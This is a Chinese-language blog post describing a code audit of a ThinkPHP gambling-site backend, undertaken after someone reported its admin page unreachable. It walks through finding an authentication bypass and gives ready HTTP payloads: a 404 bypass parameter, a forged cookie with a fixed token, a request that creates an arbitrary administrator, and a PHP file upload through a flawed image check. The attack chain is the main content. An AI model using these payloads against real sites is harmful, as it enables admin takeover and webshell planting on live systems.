#  重生之我在异世界做代码审计(BC篇)  
 实战安全研究   2025-06-08 02:01  
  
## 免责申明  
  
本文章仅用于信息安全防御技术分享，因用于其他用途而产生不良后果,作者不承担任何法律责任，请严格遵循中华人民共和国相关法律法规，禁止做一切违法犯罪行为。  
## 序言  
  
某天晚上一位大哥，跟我说某个BC站管理页面打不开了，并甩给我一套源码，便有以下的故事  
## 审计  
  
起手一看，后台的登录页面404，我顿时心一慌，赶紧看看代码![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMJx78TsgibyjRYs0MexwCLnncYYmCvhfglVQTAFxt6O7hw3eD9324qRg/640?wx_fmt=png&from=appmsg "")  
  
  
TP框架的源码，老样子看入口文件index.php  
，看核心路径在什么地方![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMicSnzjRWo42RVvySYKmmCr9JqmNT7mEWOX7T1hPpmiakVDiaPgOUVwgqQ/640?wx_fmt=png&from=appmsg "")  
  
  
寻找路由，/admin/login/login.html  
，分别代表admin  
路径，login  
控制层，login  
函数![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMqACibFFgvNvrD1icAzvt7GwSDfNP6tEN8lgYTarkSngnCFFUOF8SQSlg/640?wx_fmt=png&from=appmsg "")  
  
  
随便点击后台的文件，看到这里Index  
的类继承自Base  
类，猜测这里Base  
类为管理权限  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMUrXw9czqNAKqHT58cy8BkJbc7UMfEVwYibrhf9rV7xNmicDBTGYviawCg/640?wx_fmt=png&from=appmsg "")  
## 权限绕过  
  
这里就看到了，我们访问的时候为什么是404的状态，就是在请求路径的时候需要加上key=000  
，则可绕过404![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMTmrhf4tEKxxf3M6ucdrPy9xjgYg0trPmyvRkDia5yicOuibbXezG26cvg/640?wx_fmt=png&from=appmsg "")  
  
  
起初这里有三个需要注意的点，从Cookie中获取名为denglu  
的值，第一个获取userid  
的值，第二个获取的参数token  
,md5值必须等于xxxx(这里看图就行，有点抽象总感觉在骂人)，第三个获取otype  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMPxZNjzLyj6k0FhzicETgicKLib3T9hGQicOibxcT9BtokhgWS7uyhEcHK6A/640?wx_fmt=png&from=appmsg "")  
  
构造后发现，还是绕不过去，所有的配置文件都查看了，参数也构造很正常，但就是不行。后续发现忽略了一个点  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMs7FOcYXK92QDSt7ACsVGyoOCfNMaF1uDeQcZcH71dycHDibOvMsz6Ng/640?wx_fmt=png&from=appmsg "")  
  
cookie函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMKwMNsLydmk1beCfwoC9GQHqTeg7nWgz5KA1TpFTsL4jg4qP4ERQHgA/640?wx_fmt=png&from=appmsg "")  
  
跟进cookie函数后,我们传入的name  
值为'denglu'  
，value  
为空字符串,则进入到elseif('' === $value)  
,由于name不是以'?'开头，所以最终会调用 Cookie::get($name, $option)  
方法来获取指定名称的 Cookie值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPM6kH3cfSSF84tV92R6jYhKRkFP9vLDv1jQCL2P1IRlNaS5l56CZwDoA/640?wx_fmt=png&from=appmsg "")  
  
进入到get  
函数,判断prefix  
参数不为null  
,则使用传入的值;否则，使用类静态属性self::$config['prefix']  
的值作为默认值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMRfR4fEvm3vHtWJFm9YThmxKUJvJC3M2ekhNU8ESrvc6aL2Sjd2OXFA/640?wx_fmt=png&from=appmsg "")  
  
config  
参数的prefix  
为空  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPM4YxcBbLEsUnmhF9zOsnAU8jM7M2C7yTiaYTibTjMb4Jseg8ErHIoiakRA/640?wx_fmt=png&from=appmsg "")  
  
后续name  
值为denglu  
，判断赋值后的value  
是否已think:  
开头,则去除前缀并解码JSON  
数据，递归处理数组中的值。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMyH65JoZyeLickHBBPNVWiaXU3081KZQic88mCI9t6qgzUQGXWceV6GFuA/640?wx_fmt=png&from=appmsg "")  
  
那么最终的参数则为  
```
Cookie: denglu=think:{"otype":"1","userid":"1","token":"3c341b110c44ad9e7da4160e4f865b63"}
```  
## 信息泄露+任意管理员用户添加  
  
访问system  
控制器，发现判断传入的otype  
是否为3，否则。。(挺抽象的)![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPM9q8SmQpue4SGssyrQVTdY3Yz7icawUJPCh8AfltzialdibBbceZJaT1Ig/640?wx_fmt=png&from=appmsg "")  
  
  
后续找到管理员页面的路径  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMfsOVA6ohNk2KjKlBL32AWbZxTlaQXGOFVicX5oUwN9ribCykCUZyQIvg/640?wx_fmt=png&from=appmsg "")  
  
构造参数访问，并修改userid  
值获取列表  
```
GET /admin/system/adminlist.html?key=000 HTTP/2Host:xxxCookie: denglu=think:{"otype":"3","userid":"1","token":"3c341b110c44ad9e7da4160e4f865b63"}Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "macOS"Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: https://xxxx/admin/system/adminadd.htmlAccept-Encoding: gzip, deflate, brPriority: u=0, i
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMqVFQToJdBjgCLfIUOWpzLxdOJ9pg8zdAwibWtUueqNO0EujHKAX7QAw/640?wx_fmt=png&from=appmsg "")  
  
找到管理员添加的代码，这里重要的就两处，是不是POST请求，传入参数nickname  
和upwd  
的值，后续在将添加的信息插入到数据库中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMvoC3DbicYvo92GELnyuNkM3fpGbXF1sXvvC3dwSicgYvNibu6cuKuBiaQw/640?wx_fmt=png&from=appmsg "")  
  
那么payload则为  
```
POST /admin/system/adminadd.html HTTP/1.1Host: xxxxxContent-Length: 29X-Requested-With: XMLHttpRequestAccept-Language: zh-CN,zh;q=0.9Accept: */*Content-Type: application/x-www-form-urlencoded; charset=UTF-8User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36Accept-Encoding: gzip, deflate, brCookie: denglu=think:{"otype":"3","userid":"1","token":"3c341b110c44ad9e7da4160e4f865b63"}Connection: keep-alivenickname=zhangsan1244&upwd=23
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMALpGC6Nbr5rlmaYKJREzFS3PJzJx4kkXqIHsWbEj0u9LTPDvSWWp6w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPM93hPuYRLcWd2SWB5tk6HHnMdNmL7OVj45icUGU1QLOibnzvGDWgSUF1w/640?wx_fmt=png&from=appmsg "")  
## 文件上传  
  
这个站修复了上传接口，但是在代码中还是能找出这个上传点的，做个思路。全局搜索upload  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPM1cLWxGf9H3sfFI4iaOtqS3RPHm9mojjY5KhKcvBR4cJZnN8Eu0uVMUg/640?wx_fmt=png&from=appmsg "")  
  
这里搜索到Setup  
控制器，editerweimapost  
函数，有三个注意的点，Cookie  
中的otype  
必须为3，构造Post  
请求参数id  
，还有上传参数erweima  
。并且调用move  
方法  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMXBQVfwvDaARaGzQu2GPGmzsZZJLZ8BDAjibGKGHDV8wcFhicpDI52bpg/640?wx_fmt=png&from=appmsg "")  
  
这里的ROOT_PATH  
和DS  
都为/，所以路径为public/uploads/  
```
$info = $file->move(ROOT_PATH .'public'. DS . 'uploads');
```  
  
这里重要的也就check  
、还有move_uploaded_file  
上传的2处函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMR56PgZDMgGTGyER5rsPacRnmFEJrA4dvOicXmKXE4IkibbnCuhrvs3Eg/640?wx_fmt=png&from=appmsg "")  
  
check  
中比较关键的函数为checkImg  
，因为validate  
返回的也是空数组，所以就直接查看checkImg  
函数![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMCN8MfOJsv3QBXozdbg8n8Ohzictgib7NJJOekdw86xh3rD1m7icaZLjAQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMkmCATIOm7q9qdNWUFjat2nk6Y6WL9icOicrOMEv5DMX8D3jhJ4OiaAkmQ/640?wx_fmt=png&from=appmsg "")  
  
获取文件名的拓展名，并将其转换为小写，后续则判断拓展名是否在列表里，如果不在则跳出if  
循环，返回ture  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPM82OmAGn7g9TRWDvNdRtNmiamC1LPropYBysAwaWkIiakIWNjOZKYzSQw/640?wx_fmt=png&from=appmsg "")  
  
这里跳出if  
循环，返回ture  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMfXMuRyvTVHBcVe0VqVcXCg5vOGBhibfhvms7a1lZ7tUoSWM3l1uVs3g/640?wx_fmt=png&from=appmsg "")  
  
后续则构建文件保存名称，并生成完整文件路径。isTest  
为false，则利用move_uploaded_file  
函数上传  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMLwHXPa7omkVibGIl9cicXuzYbTMPRZXqH3gnYvzkuwf4usnke4yLxlug/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/90EWr4bdmEl9j9CCr6XWQibMnZWaKnDPMJCkFQuC8IRXicUmlRTib9LY2IEllDtqWicFibddx93NrvzKoyAtdccibReg/640?wx_fmt=png&from=appmsg "")  
  
最终的payloay  
```
POST /admin/setup/editerweimapost.html HTTP/1.1Host: Content-Length: 68385Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymXZiZ0rlKaiFjPjOUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36Cookie: denglu=think:{"otype":"3","userid":"1","token":"3c341b110c44ad9e7da4160e4f865b63"}Connection: keep-alive------WebKitFormBoundarymXZiZ0rlKaiFjPjOContent-Disposition: form-data; name="erweima"; filename="1.php"Content-Type: image/pngphp------WebKitFormBoundarymXZiZ0rlKaiFjPjOContent-Disposition: form-data; name="id"1------WebKitFormBoundarymXZiZ0rlKaiFjPjO
```  
  
## 最后  
  
      写到这里，久久没有动笔，也不知道该说些什么，那就祝各位"  
Good afternoon, good evening, and good night"  
  
## 广告  
  
      帮朋友打个广告，有想学代码审计的可以加小朋友微信：echo_Ambition888  
  
  
  
